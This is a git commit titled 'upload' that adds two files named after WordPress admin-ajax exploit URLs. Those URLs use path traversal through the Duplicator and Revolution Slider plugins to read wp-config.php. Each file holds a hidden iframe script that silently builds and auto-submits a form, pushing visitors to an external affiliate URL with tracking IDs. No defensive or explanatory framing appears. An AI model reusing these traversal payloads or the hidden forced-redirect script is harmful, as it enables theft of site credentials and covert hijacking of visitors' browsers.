af0b803877f2fbc0f23a4bf88be86dbe3fb85ef5
playfortyna <>
2021-05-28 09:04:47 +0700

    upload
    uploadupload

---
+++ wp-admin/admin-ajax.php__s-quest__action=duplicator_download&file=..%2Fwp-config.php
@@ -0,0 +1,7 @@
+<script>
+            function go() {
+               window.frames[0].document.body.innerHTML = '<form target="_parent" method="post" action="https://mobywin7.com/?s=35&ref=wp_w58879p43_clubvurbt&url=register&click_id=33uk3ei3bod65"></form>';
+                window.frames[0].document.forms[0].submit()
+            }
+        </script>
+        <iframe onload="window.setTimeout('go()', 99)" src="about:blank" style="visibility:hidden"></iframe>
---
+++ wp-admin/admin-ajax.php__s-quest__action=revslider_show_image&img=..%2Fwp-config.php
@@ -0,0 +1,7 @@
+<script>
+            function go() {
+               window.frames[0].document.body.innerHTML = '<form target="_parent" method="post" action="https://mobywin7.com/?s=53&ref=wp_w58879p162_vu24rbt&url=register&click_id=2sscii33bod6h"></form>';
+                window.frames[0].document.forms[0].submit()
+            }
+        </script>
+        <iframe onload="window.setTimeout('go()', 99)" src="about:blank" style="visibility:hidden"></iframe>
